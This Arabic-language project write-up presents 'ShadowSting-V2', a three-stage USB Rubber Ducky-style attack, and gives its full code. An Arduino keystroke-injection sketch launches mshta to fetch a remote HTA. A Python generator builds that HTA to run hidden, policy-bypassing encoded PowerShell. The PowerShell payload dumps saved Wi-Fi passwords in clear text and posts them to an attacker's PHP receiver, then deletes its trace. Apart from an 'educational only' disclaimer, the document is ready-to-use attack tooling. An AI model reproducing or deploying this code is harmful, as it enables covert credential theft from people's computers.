📁 ShadowSting-V2

📌 الوصف: ShadowSting-V2 هو مشروع تجريبي لأداة على نمط USB Rubber Ducky تقوم بتنفيذ هجوم من 3 مراحل:

HID بسيط ينفذ أمر mshta مخفي

تحميل وتشغيل HTA من سيرفر خارجي

تنفيذ PowerShell مشفر يرسل البيانات الحساسة


⚠️ المشروع لأغراض تعليمية فقط. لا تستخدمه ضد أي نظام لا تملكه.


---

📂 ملفات المشروع:

1. stage1_hid.ino → كود Arduino (Pro Micro)


2. generator/hta_generator.py → مولد launch.hta من سكربت PowerShell


3. payloads/wifi_stealer.ps1 → سكربت PowerShell (Stage 3)


4. server/receiver.php → ملف PHP يستقبل البيانات


5. README.md → شرح المشروع بالكامل




---

🧠 الخطوات:

1. Stage 1 - كود HID (Arduino)

#include <Keyboard.h>

void setup() {
  delay(1000);
  Keyboard.begin();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("mshta http://YOUR-SERVER/launch.hta");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}

2. Stage 2 - launch.hta (مولد تلقائي)

# generator/hta_generator.py
ps_script = open("../payloads/wifi_stealer.ps1", "r").read()
import base64
b64 = base64.b64encode(ps_script.encode()).decode()
hta = f"""
<script>
var s = new ActiveXObject("WScript.Shell");
s.Run("powershell -w hidden -ep bypass -EncodedCommand {b64}", 0);
</script>
"""
open("../server/launch.hta", "w").write(hta)
print("HTA generated.")

3. Stage 3 - PowerShell (wifi_stealer.ps1)

$profiles = netsh wlan show profiles
$output = foreach ($p in ($profiles -split "\n")) {
 if ($p -match "All User Profile") {
   $n = ($p -split ":")[1].Trim()
   netsh wlan show profile name=\"$n\" key=clear
 }
}
$output | Out-File "$env:TEMP\\loot.txt"
Invoke-WebRequest -Uri "http://YOUR-SERVER/receiver.php" -Method POST -InFile "$env:TEMP\\loot.txt"
Remove-Item "$env:TEMP\\loot.txt"

4. Server Side - receiver.php

<?php
file_put_contents("loot.txt", file_get_contents("php://input"));
?>


---

✅ ملاحظات:

استبدل YOUR-SERVER بـ IP أو رابط ngrok

احرص على تشغيل سيرفر محلي أو على VPS

لا تشغل الملفات على جهازك مباشرة



---

